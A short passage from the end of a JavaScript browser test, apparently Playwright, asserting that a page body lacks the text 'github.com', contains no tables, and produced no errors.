  await expect(body).not.toContainText('github.com')
  await expect(body.locator('table')).toHaveCount(0)
  expect(errors).toEqual([])
})
